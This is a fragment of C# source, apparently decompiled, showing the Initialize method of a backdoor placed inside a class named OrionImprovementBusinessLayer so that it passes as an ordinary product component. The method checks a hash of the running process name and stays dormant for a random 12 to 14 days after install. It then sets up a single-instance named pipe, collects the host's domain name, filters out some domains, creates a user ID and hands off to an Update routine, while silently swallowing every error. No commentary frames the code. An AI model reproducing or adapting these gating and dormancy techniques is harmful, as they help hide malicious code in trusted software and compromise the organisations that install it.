	public static void Initialize()
		{
			try
			{
				if (OrionImprovementBusinessLayer.GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) == 17291806236368054941UL)
				{
					DateTime lastWriteTime = File.GetLastWriteTime(Assembly.GetExecutingAssembly().Location);
					int num = new Random().Next(288, 336);
					if (DateTime.Now.CompareTo(lastWriteTime.AddHours((double)num)) >= 0)
					{
						OrionImprovementBusinessLayer.instance = new NamedPipeServerStream(OrionImprovementBusinessLayer.appId);
						OrionImprovementBusinessLayer.ConfigManager.ReadReportStatus(out OrionImprovementBusinessLayer.status);
						if (OrionImprovementBusinessLayer.status != OrionImprovementBusinessLayer.ReportStatus.Truncate)
						{
							OrionImprovementBusinessLayer.DelayMin(0, 0);
							OrionImprovementBusinessLayer.domain4 = IPGlobalProperties.GetIPGlobalProperties().DomainName;
							if (!string.IsNullOrEmpty(OrionImprovementBusinessLayer.domain4) && !OrionImprovementBusinessLayer.IsNullOrInvalidName(OrionImprovementBusinessLayer.domain4))
							{
								OrionImprovementBusinessLayer.DelayMin(0, 0);
								if (OrionImprovementBusinessLayer.GetOrCreateUserID(out OrionImprovementBusinessLayer.userId))
								{
									OrionImprovementBusinessLayer.DelayMin(0, 0);
									OrionImprovementBusinessLayer.ConfigManager.ReadServiceStatus(false);
									OrionImprovementBusinessLayer.Update();
									OrionImprovementBusinessLayer.instance.Close();
								}
							}
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}